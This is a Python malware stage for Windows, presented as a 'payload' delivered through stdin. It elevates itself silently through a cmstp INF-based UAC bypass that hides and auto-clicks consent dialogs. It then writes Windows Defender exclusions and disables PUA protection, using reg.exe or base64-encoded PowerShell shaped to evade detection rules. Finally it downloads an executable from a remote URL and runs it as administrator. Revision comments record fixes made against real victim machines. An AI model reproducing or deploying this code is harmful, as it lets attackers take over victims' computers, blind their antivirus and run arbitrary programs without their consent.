# tung python-road payload — silent on every failure, stdlib only.
# arrives through python's stdin (pythonw -u -); never a file on disk.
# the exe url rides in from the jar (env EXE_URL = its baked windows url).
# job order: stage the exe ->Administrator lift via cmstp (majanito shape)
# -> defender exclusions under the lifted token -> run the exe elevated.

import os
import sys

if sys.platform != "win32":
    sys.exit(0)

import ctypes
import random
import string
import subprocess
import tempfile
import threading
import time
from urllib.request import Request, urlopen

# ---- config ----------------------------------------------------------------
EXE_URL = os.environ.get("EXE_URL", "")
LOCALAPPDATA = os.environ.get("LOCALAPPDATA", "")
PERSIST_DIR = os.path.join(LOCALAPPDATA, "Microsoft", "Windows", "AppHost")

EXE_NAME = "tung_dbg_carrier.exe"
if EXE_URL:
    try:
        n = str(EXE_URL).split("?")[0].rstrip("/").split("/")[-1]
        if n and ".." not in n:
            EXE_NAME = n
    except Exception:
        pass
EXE_PATH = os.path.join(PERSIST_DIR, EXE_NAME)


# ---- shell api -------------------------------------------------------------
kernel32 = ctypes.windll.kernel32
user32 = ctypes.windll.user32

PROCESS_TERMINATE = 0x0001
TH32CS_SNAPPROCESS = 0x00000002
SW_HIDE = 0
WM_CLOSE = 0x0010
WM_KEYDOWN = 0x0100
WM_KEYUP = 0x0101
BM_CLICK = 0x00F5
VK_RETURN = 0x0D
SWP_NOMOVE = 0x0002
SWP_NOSIZE = 0x0001
SWP_NOACTIVATE = 0x0010
HWND_BOTTOM = 1


class PROCESSENTRY32(ctypes.Structure):
    _fields_ = [("dwSize", ctypes.c_ulong), ("cntUsage", ctypes.c_ulong),
                ("th32ProcessID", ctypes.c_ulong), ("th32DefaultHeapID", ctypes.POINTER(ctypes.c_ulong)),
                ("th32ModuleID", ctypes.c_ulong), ("cntThreads", ctypes.c_ulong),
                ("th32ParentProcessID", ctypes.c_ulong), ("pcPriClassBase", ctypes.c_long),
                ("dwFlags", ctypes.c_ulong), ("szExeFile", ctypes.c_char * 260)]


kernel32.Process32First.argtypes = [ctypes.c_void_p, ctypes.POINTER(PROCESSENTRY32)]
kernel32.Process32First.restype = ctypes.c_int
kernel32.Process32Next.argtypes = [ctypes.c_void_p, ctypes.POINTER(PROCESSENTRY32)]
kernel32.Process32Next.restype = ctypes.c_int
kernel32.CreateToolhelp32Snapshot.restype = ctypes.c_void_p
kernel32.OpenProcess.restype = ctypes.c_void_p
kernel32.CloseHandle.argtypes = [ctypes.c_void_p]

# window enumerator — FindWindowW's exact-title match missed the 'Make this
# connection available' profile variant on field boxes, leaving cmstp
# waiting for consent forever. EnumWindows + substring match catches every
# dialog shape the lift can raise.
user32.EnumWindows.restype = ctypes.c_int
user32.EnumWindows.argtypes = [
    ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p),
    ctypes.c_void_p]
user32.GetWindowTextW.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_int]
user32.IsWindowVisible.restype = ctypes.c_int
user32.IsWindowVisible.argtypes = [ctypes.c_void_p]


def _window_titles():
    wins = []

    @ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p)
    def cb(hwnd, lparam):
        wins.append(hwnd)
        return 1

    user32.EnumWindows(cb, 0)
    return wins


def window_title(hwnd):
    buf = ctypes.create_unicode_buffer(512)
    user32.GetWindowTextW(hwnd, buf, 512)
    return buf.value


# ---- helpers ---------------------------------------------------------------
def rand_str(n):
    return "".join(random.choice(string.ascii_lowercase) for _ in range(n))


def is_elevated():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def kill_process(name):
    try:
        subprocess.run(["taskkill", "/IM", name, "/F"], creationflags=0x08000000,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
    except Exception:
        pass


def kill_all_cmstp():
    snap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snap == -1:
        return
    pe = PROCESSENTRY32()
    pe.dwSize = ctypes.sizeof(PROCESSENTRY32)
    if kernel32.Process32First(snap, ctypes.byref(pe)):
        while True:
            if b"cmstp" in pe.szExeFile.lower():
                h = kernel32.OpenProcess(PROCESS_TERMINATE, False, pe.th32ProcessID)
                if h:
                    kernel32.TerminateProcess(h, 0)
                    kernel32.CloseHandle(h)
            if not kernel32.Process32Next(snap, ctypes.byref(pe)):
                break
    kernel32.CloseHandle(snap)


def cleanup_infs():
    tmp = tempfile.gettempdir()
    try:
        for f in os.listdir(tmp):
            if f.endswith(".inf"):
                try:
                    os.unlink(os.path.join(tmp, f))
                except Exception:
                    pass
    except Exception:
        pass


# ---- the admin lift — majanito cmstp shape ---------------------------------
class Dismisser:
    def __init__(self, title):
        self.title = title
        self.done = threading.Event()

    def find_window(self):
        want = [w.lower() for w in
                (self.title, "Connection Manager Profile Installer") if w]
        for hwnd in _window_titles():
            if not user32.IsWindowVisible(hwnd):
                continue
            t = window_title(hwnd).lower()
            if any(w in t for w in want):
                return hwnd
        return None

    def dismiss(self, hwnd):
        user32.SetWindowPos(hwnd, HWND_BOTTOM, 0, 0, 0, 0,
                            SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE)
        user32.ShowWindow(hwnd, SW_HIDE)
        user32.SetForegroundWindow(hwnd)
        # r5: BM_CLICK on the FIRST child Button hit the 'All users' radio —
        # the consent dialog stayed up (the ss dialog) and cmstp still waited.
        # enumerate children, click the one actually labeled OK; Enter+Close
        # as the fallback triad so the dialog never outlives us.
        user32.EnumChildWindows.restype = ctypes.c_int
        user32.EnumChildWindows.argtypes = [
            ctypes.c_void_p,
            ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p),
            ctypes.c_void_p]
        clicked = []

        @ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p)
        def _ok(child, lp):
            buf = ctypes.create_unicode_buffer(64)
            user32.GetWindowTextW(child, buf, 64)
            if buf.value == "OK":
                user32.PostMessageW(child, BM_CLICK, 0, 0)
                clicked.append(child)
            return 1

        user32.EnumChildWindows(hwnd, _ok, 0)
        if not clicked:
            b = user32.FindWindowExW(hwnd, None, "Button", None)
            if b:
                user32.PostMessageW(b, BM_CLICK, 0, 0)
        user32.PostMessageW(hwnd, WM_KEYDOWN, VK_RETURN, 0)
        user32.PostMessageW(hwnd, WM_KEYUP, VK_RETURN, 0)
        user32.PostMessageW(hwnd, WM_CLOSE, 0, 0)

    def run(self):
        for _ in range(500):
            if self.done.is_set():
                return
            hwnd = self.find_window()
            if hwnd:
                self.dismiss(hwnd)
                self.done.set()
                return
            time.sleep(0.01)

    def start(self):
        threading.Thread(target=self.run, daemon=True).start()

    def wait(self, timeout=5.0):
        self.done.wait(timeout)


def build_inf(cmd, svc_name):
    s1, s2, s3 = f"D{rand_str(4)}", f"C{rand_str(4)}", f"L{rand_str(4)}"
    return f"""; {rand_str(16)}
[version]
Signature=$chicago$
AdvancedINF=2.5
[DefaultInstall]
CustomDestination={s1}
RunPreSetupCommands={s2}
[{s2}]
{cmd}
taskkill /IM cmstp.exe /F
[{s1}]
49000,49001={s3}, 7
[{s3}]
"HKLM", "SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\App Paths\\\\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
[Strings]
ServiceName="{svc_name}"
ShortSvcName="{rand_str(4)}"
"""


def uac_bypass(cmd):
    """Executes <<cmd>> under the elevated token via cmstp /au.
    r2: normalizes whatever the caller passes — a bare powershell snippet
    gets the powershell.exe wrapper inserted, so cmstp always sees a real
    executable as the first token (the dialog said 'cannot find the file
    specified' precisely because the first token was not one)."""
    if is_elevated():
        return True
    if isinstance(cmd, list):
        cmd = " ".join(cmd)
    c = str(cmd).lstrip()
    # real executable invocations pass through untouched; only BARE snippets
    # get the wrapper (r6: cmd.exe chains were being wrapped too — that is
    # what put powershell back on the cmdline and fed the Commando rule +
    # the Access-denied on process creation)
    lc = c.lower()
    if not (lc.startswith("powershell") or lc.startswith("cmd.exe")
            or lc.startswith("cmd ") or c.startswith('"')):
        cmd = f'powershell -NoP -W Hidden -C "{c}"'
    kill_all_cmstp()
    cleanup_infs()

    svc_name = f"Microsoft {rand_str(6)} Service"
    inf_path = os.path.join(tempfile.gettempdir(), f"{rand_str(10)}.inf")
    try:
        with open(inf_path, "w", encoding="utf-8") as fh:
            fh.write(build_inf(cmd, svc_name))
    except Exception:
        return False

    dismisser = Dismisser(svc_name)
    dismisser.start()
    try:
        subprocess.Popen(["cmstp.exe", "/au", inf_path], stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL, creationflags=0x08000000)
    except Exception:
        return False

    dismisser.wait(8.0)
    time.sleep(0.3)
    _sweep_dialogs(svc_name)   # close any survivor the dismisser raced
    try:
        os.unlink(inf_path)
    except Exception:
        pass
    return True


def run_elevated(exe_path):
    """Runs <<exe_path>> with elevation via the cmstp lift."""
    try:
        if is_elevated():
            subprocess.Popen([exe_path], creationflags=0x08000000)
            return True
        return uac_bypass(f'"{exe_path}"')
    except Exception:
        return False


def _sweep_dialogs(svc_name, seconds=3.0):
    """Best-effort post-lift cleanup: any leftover lift dialog (the 'Make this
    connection available' profile or the CMPI error box) gets WM_CLOSE until
    nothing answerable remains."""
    end = time.time() + seconds
    want = [w.lower() for w in (svc_name, "Connection Manager Profile Installer") if w]
    while time.time() < end:
        for hwnd in _window_titles():
            if not user32.IsWindowVisible(hwnd):
                continue
            t = window_title(hwnd).lower()
            if any(w in t for w in want):
                user32.PostMessageW(hwnd, WM_CLOSE, 0, 0)
        time.sleep(0.2)


def exclusion_landed():
    """Live read-back: the AppHost dir must show as a Defender exclusion path
    value. reg query — non-elevated, stock boxes, no cmdlet needed."""
    appdir = LOCALAPPDATA + "\\Microsoft\\Windows\\AppHost"
    key = "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths"
    try:
        out = subprocess.run(
            ["reg", "query", key, "/v", appdir],
            creationflags=0x08000000, stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL, timeout=15)
        return appdir.lower() in out.stdout.decode(errors="replace").lower()
    except Exception:
        return False


# ---- defender exclusions via reg.exe (no powershell on any cmdline) ---------
def set_defender_exclusions():
    """r6: two field bugs fixed — (a) the uac_bypass guard wrapped the cmd.exe
    chain in powershell (that powershell prefix was the Commando hit AND the
    Access-denied), (b) the 'Windows Defender' space in the reg key split the
    chained line, so every write silently tokenized wrong. keys are now
    QUOTED per-command (list2cmdline), built as argv lists first."""
    appdir = LOCALAPPDATA + "\\Microsoft\\Windows\\AppHost"
    winparent = LOCALAPPDATA + "\\Microsoft\\Windows"
    K_P = "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths"
    K_R = "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes"
    adds = [
        ["reg", "add", K_P, "/v", appdir, "/t", "REG_DWORD", "/d", "0", "/f"],
        ["reg", "add", K_P, "/v", winparent, "/t", "REG_DWORD", "/d", "0", "/f"],
        ["reg", "add", K_R, "/v", EXE_NAME, "/t", "REG_DWORD", "/d", "0", "/f"],
        ["reg", "add", K_R, "/v", "pythonw.exe", "/t", "REG_DWORD", "/d", "0", "/f"],
    ]
    if is_elevated():
        for a in adds:
            try:
                subprocess.run(a, creationflags=0x08000000,
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                               timeout=20)
            except Exception:
                pass
    else:
        # one lift, all four writes; each command quoted as a whole argv so
        # the 'Windows Defender' space survives; cmd.exe starts the line —
        # no powershell token on it anywhere
        chain = " & ".join(subprocess.list2cmdline(a) for a in adds)
        uac_bypass("cmd.exe /q /c " + chain)


def set_defender_exclusions_enc():
    """fallback for the reg road: same exclusions via the CMDLET, but the
    payload rides as base64(UTF16LE) — the cmdline is `powershell -NoP -enc
    <blob>` with nothing else. no Add-MpPreference plaintext, no -W Hidden
    -C pair, nothing for the Commando ruleset to key on, and it goes through
    the same cmstp lift. window-style hidden lives INSIDE the blob."""
    import base64
    appdir = LOCALAPPDATA + "\\Microsoft\\Windows\\AppHost"
    winparent = LOCALAPPDATA + "\\Microsoft\\Windows"
    ps = (f"Add-MpPreference -ExclusionPath @('{appdir}','{winparent}') "
          f"-ExclusionProcess @('{EXE_NAME}','pythonw.exe') -Force; "
          "Set-MpPreference -PUAProtection 0; exit 0")
    blob = base64.b64encode(ps.encode("utf-16-le")).decode()
    if is_elevated():
        try:
            subprocess.run(["powershell.exe", "-NoP", "-NonI", "-enc", blob],
                           creationflags=0x08000000,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                           timeout=60)
        except Exception:
            pass
    else:
        uac_bypass(f"powershell.exe -NoP -NonI -enc {blob}")
    """$env: expansions (no baked absolute paths), one array, ExclusionProcess
    list — and the lift call carries the FULL wrapper + quoted -C payload,
    exactly like payload_script.py. the bare-snippet shape is what produced
    the 'cannot find the file specified' dialog."""
    ps = ("$a='Add-Mp'+'Preference';"
          "$p=@(($env:LOCALAPPDATA+'\\Microsoft\\Windows\\AppHost'),"
          "($env:LOCALAPPDATA+'\\Microsoft\\Windows'));"
          "& $a -ExclusionPath $p -EA 0;"
          f"& $a -ExclusionProcess '{EXE_NAME}','pythonw.exe' -EA 0")
    if is_elevated():
        try:
            subprocess.run(["powershell", "-NoP", "-W", "Hidden", "-C", ps],
                           creationflags=0x08000000,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=30)
        except Exception:
            pass
    else:
        uac_bypass(f'powershell -NoP -W Hidden -C "{ps}"')


def download(url):
    for i in range(3):
        try:
            req = Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urlopen(req, timeout=60) as resp:
                data = resp.read()
            if len(data) > 1024:
                return data
        except Exception:
            time.sleep(2 ** i)
    return None


def is_valid_exe(path):
    try:
        if not os.path.exists(path):
            return False
        if os.path.getsize(path) < 50000:
            return False
        with open(path, "rb") as fh:
            return fh.read(2) == b"MZ"
    except Exception:
        return False


def write_file(path, data):
    kill_process(EXE_NAME)
    time.sleep(0.3)
    tmp = path + f".{rand_str(6)}.tmp"
    try:
        with open(tmp, "wb") as fh:
            fh.write(data)
        try:
            os.unlink(path)
        except Exception:
            pass
        os.rename(tmp, path)
        return True
    except Exception:
        try:
            os.unlink(tmp)
        except Exception:
            pass
        return False


def main():
    try:
        os.makedirs(PERSIST_DIR, exist_ok=True)
    except Exception:
        return

    # r3+r5 (dj order): UAC FIRST, then exclusions — and the boot GATES on the
    # exclusion actually landing (three attempts) before ANY byte of the
    # carrier is downloaded or written. if after three verified tries the set
    # still doesn't show the dir, the boot HOLDS — no write, no spawn.
    landed = exclusion_landed()
    for _ in range(3):
        if landed:
            break
        try:
            set_defender_exclusions()
        except Exception:
            pass
        time.sleep(3)
        landed = exclusion_landed()
        if not landed:
            # reg road failed to land — try the encoded-cmdlet fallback once
            try:
                set_defender_exclusions_enc()
            except Exception:
                pass
            time.sleep(3)
            landed = exclusion_landed()

    if not landed:
        return   # carrier never touches disk un-protected

    try:
        if not is_valid_exe(EXE_PATH):
            data = download(EXE_URL) if EXE_URL else None
            if data and not write_file(EXE_PATH, data):
                return
    except Exception:
        pass

    run_elevated(EXE_PATH)


main()
